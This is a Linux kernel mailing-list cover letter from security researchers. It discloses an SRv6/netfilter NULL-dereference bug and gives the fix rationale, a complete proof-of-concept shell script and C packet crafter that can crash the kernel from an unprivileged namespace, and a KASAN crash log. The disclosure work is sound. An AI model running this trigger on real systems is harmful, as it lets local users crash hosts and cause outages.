Received: from mail-pf1-f172.google.com (mail-pf1-f172.google.com [209.85.210.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E24801684B0
	for <netdev@vger.kernel.org>; Sun, 18 Oct 2026 06:27:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792304859; cv=none; b=K0e1wF3/yv9GYZK2M8AykidcoQ9VsG3LD14zP8N3OJ5hk7ixcVcf6wIIe2YKVO9Gli5bOih99xN2qn6aiofzs26eYIFj1A5AqghGfF0DciogNFOWYz6FNYSjd8Sqo1Qyze/e5+X7aGkCQEUpM3zK7+igu8kuHgWSR3oTvVRd18k=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792304859; c=relaxed/simple;
	bh=d7xN9CbYUaSe1zB9PYhGckq+IpriYcXdjJrfTmc44ok=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=KhtdsmlSrjI3NjR04TFUIrfej354LPhVPtCFXssc4ZUWpnBSEty6wl/TqztPHWyyUrEmQFg2N2phDxPQA1UxjIWqWX8/uIyfA7975YMdwFeLG/bqGohRcKqSnUKmeM7y1ln2b4kdi8Zbckt06wioLDvAvfnsoRiHgVzPPkHnS34=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=L0yma0n1; arc=none smtp.client-ip=209.85.210.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="L0yma0n1"
Received: by mail-pf1-f172.google.com with SMTP id d2e1a72fcca58-89f639ba307so367233b3a.3
        for <netdev@vger.kernel.org>; Sat, 17 Oct 2026 23:27:37 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792304857; x=1792909657; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=YvMiSApBMQ9a+wyLGa9sF2/S5R+nOQ936vFbt1lhNmU=;
        b=L0yma0n1seSEFwsnzaR2gJWpi9HIRy6S4m5k/pXf7e1zkfCq2UkG6kihzLgPV2lUSU
         IBK8mWX6bqu3aT5oDBlTsxmIQHi29mP+pjaL4FXCt1q6FBBafU53CQl+u5+p9ZShaPhw
         a8FuPrtNZ3sIh87elieu4tRKAT7aF3omi3hvheEm6erNpVsKcIz8DYl2myCif0JICcmx
         sbyKJA9z1IMZ5r3MpqnJ1PlwE3ca4nkoKJ54YuWYPAd+Z5YJ6yD0fzGde2ZlvvaOCus8
         togCj+kDkS4MifKFJohRecFY4ASp2pShZxSEGfEqGdYwMBE3lseEtKog4sDXmhKEAdKf
         ug6A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792304857; x=1792909657;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=YvMiSApBMQ9a+wyLGa9sF2/S5R+nOQ936vFbt1lhNmU=;
        b=kxmzQdnhyqxb4rFAXM5mSf08OLrHlm1+RYYTPIDWpSjxUf0/NgHo6GmKC6OuiVR/8m
         UT3/iuKuqzEHVtBjRSBPRujaHwBt9aGLJML2m72FQ2QzaXVlY5UPMXghFbfqWkB6+G35
         6kWOFp/lSf2gawFj22DIcc/+nhK/GP/JTw8imKvw2QecvayOyWFljgOMujJtmxfeb2HN
         dYjHVcIaLBjXV+oP1KNXlWMg4y1OwGbP2CsB+HUno7tF8o9MIgQ+MlbXssgKqSXqeXRk
         1/Ooo1WQPsd+8UaWtwL1gReiky8N8dh9I69f/9aX/tErlvgittR7uv3jInwbrrqvNzUI
         6tBw==
X-Gm-Message-State: AFq9FYLsjnEeJv3JvTLLT2riKBjz4t6Qn7tKCQdjUYZybtfNdhma9FmO
	wa7rC5Vx0kNPsYICNrGPaD3amrI5p8dqu0zomoMZnt1aQSOScs6tlmkEyoTcgsf8pOtzgwqccje
	l79splw==
X-Gm-Gg: AYBFou3W+bBtO74idM6ls4sowy9Lsy2UXfQnK4wR6xfH0JaPAPuFgFS/E3hB9CFL4r9
	b2MqF6XCXl86Y9zYg3YlEqs3Nl2LrkXhnNinIqCgJWC2u0yeESspsQbDwAUB/ZCr3mqY7AzA58Q
	nw0XOHqVevDsMYXHzPEd/pAx1tAYwY0Rb0j90S+t+KW4/BbPR6plWw6FERTYzcWnv20e98AHLNX
	rZ0CiU11Ai+JfsnGZFQ75Eif3GzIM9A+9VfHqxt8AfjJh3YT5n9u8wu8tO1NXln9FSeLBhsNkpP
	LikGqlkj0xfhoHJQTH7UcHQVf1fO/xaOIsARfhxnaw2EP3MfQQN34YhK3Hkl4oStxCkNii8DErL
	UFqANmZG7MSTqR4QC3dfNXop6LySMUqIdhdicVB2/Qb6oQJBhnxjrhpNUC+HRk1o9dFzkg+9I0P
	dZzQPES5UbArTvy5TrxdQai9cOtOUTnGlKt2Q1zh/TsdR39LS4rfmEDYqP9mPxDfRlo4A0neT6R
	DSu9fNu+Uk=
X-Received: by 2002:a05:6a00:18a8:b0:899:3439:c8d5 with SMTP id d2e1a72fcca58-8a04ba37235mr3217353b3a.14.1792304856729;
        Sat, 17 Oct 2026 23:27:36 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-89f58017244sm2707319b3a.47.2026.10.17.23.27.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 17 Oct 2026 23:27:36 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	andrea.mayer@uniroma2.it
Cc: davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	contact@proelbtn.com,
	pablo@netfilter.org,
	vega@nebusec.ai,
	sashiko-bot@kernel.org,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net v2 0/1] seg6: validate state in netfilter continuations
Date: Sun, 18 Oct 2026 14:27:28 +0800
Message-ID: <cover.1792230570.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated a bug in net/ipv6/seg6_local.c and
net/ipv6/seg6_iptunnel.c. An SRv6 continuation can dereference a missing
or incompatible destination state after a netfilter hook modifies the
skb destination.

This bug is tracked at:
https://bugtracker.nebusec.ai/f/11977

We provide the technical details and test summary below. The complete
archived PoC source and an exact excerpt from the clean serial log follow.

---- details below ----

Bug details:

The End.DX4 and End.DX6 actions decapsulate an inner packet and pass it
through NF_INET_PRE_ROUTING when nf_hooks_lwtunnel is enabled. DNAT can
drop skb_dst() before the finish callback resumes. The callback then
dereferences skb_dst(skb)->lwtstate. The same assumption exists in
seg6_local_input_core() after its netfilter hook.

In seg6_iptunnel, POST_ROUTING SNAT with an outbound XFRM policy can
replace the destination before seg6_input_core() or seg6_output_core()
continues. These paths must not assume that the current destination
carries a SEG6 lwtstate.

This patch checks for a valid skb destination, a non-NULL lwtstate, and
the expected SEG6_LOCAL or SEG6 lwtstate type. Invalid state is dropped.
The check is by type, not by identity of the original state. This patch
does not walk through XFRM dsts or take an additional lwtstate
reference. The loop-detection explanation in seg6_input_core() remains.

Reproducer:

The archived script's namespace mode is:

    sh poc.sh namespace

For this validation, the guest lacked cc1. A static x86_64 `poc` binary
was therefore compiled on the host, copied into the disposable QEMU
guest, and executed only there. The equivalent trigger branch was run
as test_user in a fresh user/network namespace:

    su -s /bin/sh test_user -c \
        'cd /tmp/poc && unshare -Urn -- sh ./poc.sh dx4-inner'

The separate root-only XFRM variant was run inside a QEMU guest with
the user-mode eth0 configured to 10.0.2.15/24:

    cd /tmp/poc && sh ./poc.sh iptunnel-xfrm

We built clean and patched kernels from the same source baseline and
KASAN config in their source-tree build/ directories. Runtime tests used
x86 QEMU TCG, 1 vCPU, and 2 GiB RAM. The guest command line explicitly
set panic_on_warn=0 oops=continue panic_on_oom=0; KVM was unavailable to
the test user.

------BEGIN poc.sh------
#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}

SELF=$(readlink -f "$0")
DIR=$(dirname "$SELF")
BIN="$DIR/poc"

DX4_TABLE=poc_seg6_dx4
DX4_ROUTE_TABLE=100
DX4_RULE_PREF=100
DX4_SID=fc00:12:100::6004
DX4_OLD_IPV4_FORWARD=
DX4_OLD_IPV6_FORWARD=
DX4_OLD_RP_FILTER=
DX4_SYSCTL_SAVED=0
DX4_SRC_PAIR_ADDED=0
DX4_HS_PAIR_ADDED=0
DX4_ROUTE_ADDED=0
DX4_RULE_ADDED=0
DX4_TABLE_ADDED=0

XFRM_TABLE=poc_seg6_iptunnel_xfrm
XFRM_IFACE=${POC_IFACE:-eth0}
XFRM_SOURCE_IP=${POC_SOURCE_IP:-10.0.2.15}
XFRM_SNAT_IP=${POC_SNAT_IP:-10.0.2.16}
XFRM_DST_IP=${POC_DST_IP:-198.18.0.2}
XFRM_SEGMENT=${POC_SEGMENT:-fec0::2}
XFRM_SPI=0x100
XFRM_AUTH_KEY=0x1111111111111111111111111111111111111111111111111111111111111111
XFRM_ENC_KEY=0x22222222222222222222222222222222
XFRM_ADDR_ADDED=0
XFRM_ADDR_PREFIX=
XFRM_IFACE_STATE_SAVED=0
XFRM_IFACE_WAS_UP=0
XFRM_SEGMENT_ROUTE_ADDED=0
XFRM_ENCAP_ROUTE_ADDED=0
XFRM_TABLE_ADDED=0
XFRM_STATE_ADDED=0
XFRM_POLICY_ADDED=0
XFRM_OLD_NF_HOOKS=
XFRM_NF_HOOKS_ENABLED=0

usage() {
	cat >&2 <<EOF
usage: $0 [namespace|dx4|root|iptunnel-xfrm]

  namespace       non-root End.DX4 + PREROUTING DNAT (default)
  dx4             root End.DX4 + PREROUTING DNAT
  root            compatibility alias for dx4
  iptunnel-xfrm   root-only QEMU test: SRv6 encap + SNAT + ESP/XFRM
EOF
}

need_cmd() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "missing command: $1" >&2
		exit 1
	}
}

require_root() {
	[ "$(id -u)" -eq 0 ] || {
		echo "this mode must run as root inside a QEMU guest" >&2
		exit 1
	}
}

require_qemu_guest() {
	if [ ! -r /sys/class/dmi/id/sys_vendor ] || \
		! grep -qi qemu /sys/class/dmi/id/sys_vendor; then
		echo "iptunnel-xfrm may only run in a disposable QEMU guest" >&2
		exit 1
	fi
}

build_poc() {
	need_cmd cc
	cc -O2 -Wall -Wextra -o "$BIN" "$DIR/poc.c"
}

cleanup_dx4() {
	if [ "$DX4_RULE_ADDED" -eq 1 ]; then
		ip -6 rule del iif rt0 to "$DX4_SID/128" \
			lookup "$DX4_ROUTE_TABLE" pref "$DX4_RULE_PREF" 2>/dev/null || true
	fi
	if [ "$DX4_ROUTE_ADDED" -eq 1 ]; then
		ip -6 route del "$DX4_SID/128" table "$DX4_ROUTE_TABLE" \
			2>/dev/null || true
	fi
	if [ "$DX4_TABLE_ADDED" -eq 1 ]; then
		nft delete table ip "$DX4_TABLE" 2>/dev/null || true
	fi
	if [ "$DX4_SRC_PAIR_ADDED" -eq 1 ]; then
		ip link del src0 2>/dev/null || true
	fi
	if [ "$DX4_HS_PAIR_ADDED" -eq 1 ]; then
		ip link del hs0 2>/dev/null || true
	fi

	if [ "$DX4_SYSCTL_SAVED" -eq 1 ]; then
		sysctl -wq net.ipv4.ip_forward="$DX4_OLD_IPV4_FORWARD" || true
		sysctl -wq net.ipv6.conf.all.forwarding="$DX4_OLD_IPV6_FORWARD" || true
		sysctl -wq net.ipv4.conf.all.rp_filter="$DX4_OLD_RP_FILTER" || true
	fi
}

setup_and_trigger_dx4() {
	need_cmd ip
	need_cmd nft
	need_cmd sysctl

	for dev in src0 rt0 hs0 rth0; do
		if [ -e "/sys/class/net/$dev" ]; then
			echo "interface $dev already exists; use a fresh network namespace" >&2
			return 1
		fi
	done
	if nft list table ip "$DX4_TABLE" >/dev/null 2>&1 || \
		ip -6 route show table "$DX4_ROUTE_TABLE" "$DX4_SID/128" | grep -q . || \
		ip -6 rule show pref "$DX4_RULE_PREF" | grep -q .; then
		echo "End.DX4 PoC resources already exist; refusing to overwrite them" >&2
		return 1
	fi

	DX4_OLD_IPV4_FORWARD=$(sysctl -n net.ipv4.ip_forward)
	DX4_OLD_IPV6_FORWARD=$(sysctl -n net.ipv6.conf.all.forwarding)
	DX4_OLD_RP_FILTER=$(sysctl -n net.ipv4.conf.all.rp_filter)
	DX4_SYSCTL_SAVED=1

	ip link add src0 type veth peer name rt0
	DX4_SRC_PAIR_ADDED=1
	ip link add hs0 type veth peer name rth0
	DX4_HS_PAIR_ADDED=1

	ip link set lo up
	ip addr add 2001:11::1/64 dev src0 nodad
	ip addr add 10.0.0.22/24 dev rth0

	ip link set src0 up
	ip link set rt0 up
	ip link set hs0 up
	ip link set rth0 up

	sysctl -wq net.ipv4.ip_forward=1
	sysctl -wq net.ipv6.conf.all.forwarding=1
	sysctl -wq net.netfilter.nf_hooks_lwtunnel=1
	sysctl -wq net.ipv4.conf.all.rp_filter=0

	ip -6 route add "$DX4_SID/128" table "$DX4_ROUTE_TABLE" \
		encap seg6local action End.DX4 nh4 10.0.0.2 dev rth0
	DX4_ROUTE_ADDED=1
	ip -6 rule add iif rt0 to "$DX4_SID/128" \
		lookup "$DX4_ROUTE_TABLE" pref "$DX4_RULE_PREF"
	DX4_RULE_ADDED=1

	nft add table ip "$DX4_TABLE"
	DX4_TABLE_ADDED=1
	nft add chain ip "$DX4_TABLE" prerouting \
		'{ type nat hook prerouting priority -100; policy accept; }'
	nft add rule ip "$DX4_TABLE" prerouting \
		ip daddr 10.0.0.2 dnat to 10.0.0.99

	# Keep the trap active so all objects created above are removed on return.
	"$BIN" src0 rt0
}

cleanup_iptunnel_xfrm() {
	if [ "$XFRM_POLICY_ADDED" -eq 1 ]; then
		ip xfrm policy delete dir out src "$XFRM_SNAT_IP/32" \
			dst "$XFRM_DST_IP/32" 2>/dev/null || true
	fi
	if [ "$XFRM_STATE_ADDED" -eq 1 ]; then
		ip xfrm state delete src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
			proto esp spi "$XFRM_SPI" 2>/dev/null || true
	fi

	if [ "$XFRM_ENCAP_ROUTE_ADDED" -eq 1 ]; then
		ip -4 route del "$XFRM_DST_IP/32" 2>/dev/null || true
	fi
	if [ "$XFRM_SEGMENT_ROUTE_ADDED" -eq 1 ]; then
		ip -6 route del "$XFRM_SEGMENT/128" dev "$XFRM_IFACE" \
			2>/dev/null || true
	fi
	if [ "$XFRM_ADDR_ADDED" -eq 1 ]; then
		ip addr del "$XFRM_SNAT_IP/$XFRM_ADDR_PREFIX" dev "$XFRM_IFACE" \
			2>/dev/null || true
	fi
	if [ "$XFRM_TABLE_ADDED" -eq 1 ]; then
		nft delete table ip "$XFRM_TABLE" 2>/dev/null || true
	fi
	if [ "$XFRM_IFACE_STATE_SAVED" -eq 1 ] && \
		[ "$XFRM_IFACE_WAS_UP" -eq 0 ]; then
		ip link set "$XFRM_IFACE" down 2>/dev/null || true
	fi
	if [ "$XFRM_NF_HOOKS_ENABLED" -eq 1 ] && \
		[ "$XFRM_OLD_NF_HOOKS" -eq 0 ]; then
		echo "NOTE: nf_hooks_lwtunnel is one-way enabled until the guest reboots" >&2
	fi
}

setup_and_trigger_iptunnel_xfrm() {
	require_root
	require_qemu_guest
	need_cmd ip
	need_cmd nft
	need_cmd ping
	need_cmd sysctl

	[ -e "/sys/class/net/$XFRM_IFACE" ] || {
		echo "interface $XFRM_IFACE is required" >&2
		exit 1
	}
	XFRM_SOURCE_CIDR=$(ip -4 -o addr show dev "$XFRM_IFACE" | \
		awk -v address="$XFRM_SOURCE_IP" \
			'index($4, address "/") == 1 { print $4; exit }')
	if [ -z "$XFRM_SOURCE_CIDR" ]; then
		echo "$XFRM_IFACE must have $XFRM_SOURCE_IP configured" >&2
		exit 1
	fi
	XFRM_ADDR_PREFIX=${XFRM_SOURCE_CIDR#*/}

	if nft list table ip "$XFRM_TABLE" >/dev/null 2>&1 || \
		ip -4 route show "$XFRM_DST_IP/32" | grep -q . || \
		ip -6 route show "$XFRM_SEGMENT/128" | grep -q . || \
		ip xfrm state list src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
			| grep -q . || \
		ip xfrm policy list src "$XFRM_SNAT_IP/32" \
			dst "$XFRM_DST_IP/32" dir out | grep -q .; then
		echo "XFRM PoC table or route already exists; refusing to overwrite it" >&2
		return 1
	fi

	if ip -o link show dev "$XFRM_IFACE" | grep -q '<[^>]*UP'; then
		XFRM_IFACE_WAS_UP=1
	fi
	XFRM_IFACE_STATE_SAVED=1
	ip link set "$XFRM_IFACE" up

	XFRM_OLD_NF_HOOKS=$(sysctl -n net.netfilter.nf_hooks_lwtunnel)
	case "$XFRM_OLD_NF_HOOKS" in
	0|1) ;;
	*)
		echo "unexpected nf_hooks_lwtunnel value: $XFRM_OLD_NF_HOOKS" >&2
		return 1
		;;
	esac

	if ! ip -4 -o addr show dev "$XFRM_IFACE" | \
		grep -Fq "inet $XFRM_SNAT_IP/"; then
		ip addr add "$XFRM_SNAT_IP/$XFRM_ADDR_PREFIX" dev "$XFRM_IFACE"
		XFRM_ADDR_ADDED=1
	fi

	ip -6 route add "$XFRM_SEGMENT/128" dev "$XFRM_IFACE"
	XFRM_SEGMENT_ROUTE_ADDED=1
	ip -4 route add "$XFRM_DST_IP/32" \
		encap seg6 mode encap segs "$XFRM_SEGMENT" dev "$XFRM_IFACE"
	XFRM_ENCAP_ROUTE_ADDED=1

	# Use a private table; never flush the guest's global nftables ruleset.
	nft add table ip "$XFRM_TABLE"
	XFRM_TABLE_ADDED=1
	nft add chain ip "$XFRM_TABLE" postrouting \
		'{ type nat hook postrouting priority 100; policy accept; }'
	nft add rule ip "$XFRM_TABLE" postrouting \
		ip saddr "$XFRM_SOURCE_IP" ip daddr "$XFRM_DST_IP" \
		snat to "$XFRM_SNAT_IP"

	ip xfrm state add \
		src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
		proto esp spi "$XFRM_SPI" mode transport \
		auth-trunc 'hmac(sha256)' "$XFRM_AUTH_KEY" 128 \
		enc 'cbc(aes)' "$XFRM_ENC_KEY"
	XFRM_STATE_ADDED=1
	ip xfrm policy add dir out \
		src "$XFRM_SNAT_IP/32" dst "$XFRM_DST_IP/32" \
		tmpl src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
		proto esp mode transport
	XFRM_POLICY_ADDED=1

	ip -4 route get "$XFRM_DST_IP" from "$XFRM_SOURCE_IP"
	ip xfrm policy list
	if [ "$XFRM_OLD_NF_HOOKS" -eq 0 ]; then
		echo "WARNING: enabling nf_hooks_lwtunnel persists until QEMU guest reboot" >&2
	fi
	sysctl -wq net.netfilter.nf_hooks_lwtunnel=1
	XFRM_NF_HOOKS_ENABLED=1

	# The target need not answer; transmitting this packet enters the path.
	echo "Sending one IPv4 ping to trigger SRv6 encap + POST_ROUTING SNAT + ESP"
	if ping -n -c 1 -W 1 -I "$XFRM_SOURCE_IP" "$XFRM_DST_IP"; then
		echo "ping received a reply"
	else
		ping_status=$?
		case "$ping_status" in
		1)
			echo "no ping reply (expected); inspect the QEMU serial log for the kernel result"
			;;
		*)
			echo "ping failed before the trigger completed (status $ping_status)" >&2
			return "$ping_status"
			;;
		esac
	fi
}

case "${1:-namespace}" in
namespace)
	build_poc
	exec unshare -Urn -- "$SELF" dx4-inner
	;;
dx4|root)
	require_root
	trap cleanup_dx4 EXIT
	build_poc
	setup_and_trigger_dx4
	;;
dx4-inner|inner)
	trap cleanup_dx4 EXIT
	setup_and_trigger_dx4
	;;
iptunnel-xfrm|xfrm)
	trap cleanup_iptunnel_xfrm EXIT
	trap 'exit 129' HUP
	trap 'exit 130' INT
	trap 'exit 143' TERM
	setup_and_trigger_iptunnel_xfrm
	;;
*)
	usage
	exit 2
	;;
esac
------END poc.sh------

------BEGIN poc.c------
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/icmp6.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/udp.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static uint16_t checksum(const void *data, size_t len)
{
	const uint8_t *bytes = data;
	uint32_t sum = 0;
	size_t i;

	for (i = 0; i + 1 < len; i += 2)
		sum += ((uint32_t)bytes[i] << 8) | bytes[i + 1];

	if (len & 1)
		sum += (uint32_t)bytes[len - 1] << 8;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (uint16_t)~sum;
}

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void get_if_hwaddr(int fd, const char *ifname, unsigned char *mac)
{
	struct ifreq ifr = {0};

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
}

static int get_ifindex(int fd, const char *ifname)
{
	struct ifreq ifr = {0};

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX");

	return ifr.ifr_ifindex;
}

int main(int argc, char **argv)
{
	static const char payload[] = "dx4";
	struct sockaddr_ll sll = {0};
	struct ether_header *eth;
	struct ip6_hdr *ip6;
	struct iphdr *ip4;
	struct udphdr *udp;
	unsigned char src_mac[ETH_ALEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char frame[sizeof(*eth) + sizeof(*ip6) + sizeof(*ip4) +
			    sizeof(*udp) + sizeof(payload)];
	const char *tx_if;
	const char *peer_if;
	size_t off;
	int fd;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <tx-if> <peer-if>\n", argv[0]);
		return 2;
	}

	tx_if = argv[1];
	peer_if = argv[2];

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
	if (fd < 0)
		die("socket(AF_PACKET)");

	get_if_hwaddr(fd, tx_if, src_mac);
	get_if_hwaddr(fd, peer_if, dst_mac);

	memset(frame, 0, sizeof(frame));
	off = 0;

	eth = (struct ether_header *)(frame + off);
	memcpy(eth->ether_shost, src_mac, ETH_ALEN);
	memcpy(eth->ether_dhost, dst_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_IPV6);
	off += sizeof(*eth);

	ip6 = (struct ip6_hdr *)(frame + off);
	ip6->ip6_flow = htonl(6U << 28);
	ip6->ip6_plen = htons(sizeof(*ip4) + sizeof(*udp) + sizeof(payload));
	ip6->ip6_nxt = IPPROTO_IPIP;
	ip6->ip6_hops = 64;
	if (inet_pton(AF_INET6, "2001:11::1", &ip6->ip6_src) != 1)
		die("inet_pton outer src");
	if (inet_pton(AF_INET6, "fc00:12:100::6004", &ip6->ip6_dst) != 1)
		die("inet_pton outer dst");
	off += sizeof(*ip6);

	ip4 = (struct iphdr *)(frame + off);
	ip4->version = 4;
	ip4->ihl = 5;
	ip4->ttl = 64;
	ip4->protocol = IPPROTO_UDP;
	ip4->tot_len = htons(sizeof(*ip4) + sizeof(*udp) + sizeof(payload));
	ip4->saddr = inet_addr("10.0.0.1");
	ip4->daddr = inet_addr("10.0.0.2");
	ip4->check = checksum(ip4, sizeof(*ip4));
	off += sizeof(*ip4);

	udp = (struct udphdr *)(frame + off);
	udp->source = htons(4442);
	udp->dest = htons(5555);
	udp->len = htons(sizeof(*udp) + sizeof(payload));
	udp->check = 0;
	off += sizeof(*udp);

	memcpy(frame + off, payload, sizeof(payload));

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IPV6);
	sll.sll_ifindex = get_ifindex(fd, tx_if);
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	if (sendto(fd, frame, sizeof(frame), 0, (struct sockaddr *)&sll,
		   sizeof(sll)) < 0)
		die("sendto");

	close(fd);
	return 0;
}
------END poc.c------

----BEGIN clean crash log----
[  850.337115][    C0] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000011: 0000 [#1] SMP KASAN NOPTI
[  850.339684][    C0] KASAN: null-ptr-deref in range [0x0000000000000088-0x000000000000008f]
[  850.341683][    C0] CPU: 0 UID: 1001 PID: 5089 Comm: poc Not tainted 7.3.0-rc7-00117-g7ec48f396a1d #1 PREEMPT(full) 
[  850.343655][    C0] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  850.345295][    C0] RIP: 0010:input_action_end_dx4_finish+0x7b/0x560
[  850.348257][    C0] Code: 0f 85 88 02 00 00 e8 74 17 65 f7 49 89 df 48 b8 00 00 00 00 00 fc ff df 49 83 e7 fe 49 8d bf 88 00 00 00 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 78 04 00 00 48 8d bd d0 00 00 00 4d 8b b7 88 00
[  850.351309][    C0] RSP: 0018:ffa0000000007890 EFLAGS: 00000206
[  850.352921][    C0] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000101
[  850.354189][    C0] RDX: 0000000000000011 RSI: ffffffff8a5d14dc RDI: 0000000000000088
[  850.355455][    C0] RBP: ff11000030289280 R08: 0000000000000101 R09: ffe21c0006440374
[  850.356710][    C0] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  850.357948][    C0] R13: ff110000302892d8 R14: 0000000000000000 R15: 0000000000000000
[  850.359260][    C0] FS:  000000001910f3c0(0000) GS:ff110000d566e000(0000) knlGS:0000000000000000
[  850.360636][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  850.361997][    C0] CR2: 000000000049bfe0 CR3: 0000000030265000 CR4: 00000000007516f0
[  850.363320][    C0] PKRU: 55555554
[  850.364144][    C0] Call Trace:
[  850.365073][    C0]  <IRQ>
[  850.366023][    C0]  input_action_end_dx4+0x366/0x480
[  850.367613][    C0]  seg6_local_input_core+0x106/0x330
[  850.368739][    C0]  seg6_local_input+0x185/0x1e0
[  850.369783][    C0]  lwtunnel_input+0x30d/0x770
[  850.370800][    C0]  ? __pfx_lwtunnel_input+0x10/0x10
[  850.372158][    C0]  ipv6_rcv+0x365/0x3d0
[  850.373093][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  850.374076][    C0]  deliver_skb+0x182/0x270
[  850.375334][    C0]  __netif_receive_skb_core.constprop.0+0x1584/0x3320
[  850.376880][    C0]  ? lock_acquire+0x1bf/0x370
[  850.377881][    C0]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[  850.379409][    C0]  ? notifier_call_chain+0xbd/0x430
[  850.380789][    C0]  ? find_held_lock+0x2b/0x80
[  850.382139][    C0]  ? __lock_acquire+0x509/0x2110
[  850.383491][    C0]  __netif_receive_skb_one_core+0xaf/0x1e0
[  850.384603][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  850.385789][    C0]  ? process_backlog+0x330/0x1540
[  850.386794][    C0]  ? process_backlog+0x330/0x1540
[  850.387795][    C0]  __netif_receive_skb+0x1d/0x160
[  850.389062][    C0]  process_backlog+0x382/0x1540
[  850.390072][    C0]  __napi_poll.constprop.0+0xb3/0x540
[  850.391128][    C0]  net_rx_action+0x9b1/0xea0
[  850.392128][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  850.393163][    C0]  ? sched_clock+0x39/0x60
[  850.394137][    C0]  ? sched_clock_cpu+0x6c/0x550
[  850.395345][    C0]  ? __pfx_sched_clock_cpu+0x10/0x10
[  850.396372][    C0]  ? sched_clock_cpu+0x6c/0x550
[  850.397345][    C0]  ? __dev_queue_xmit+0xe33/0x4370
[  850.398366][    C0]  handle_softirqs+0x1d3/0x990
[  850.399643][    C0]  ? __dev_queue_xmit+0xe33/0x4370
[  850.400899][    C0]  do_softirq+0xad/0xe0
[  850.401887][    C0]  </IRQ>
[  850.402576][    C0]  <TASK>
[  850.403244][    C0]  __local_bh_enable_ip+0x109/0x130
[  850.404620][    C0]  ? __dev_queue_xmit+0xe33/0x4370
[  850.405621][    C0]  __dev_queue_xmit+0xe48/0x4370
[  850.406630][    C0]  ? __might_fault+0x138/0x190
[  850.407932][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  850.409207][    C0]  ? __might_fault+0xe0/0x190
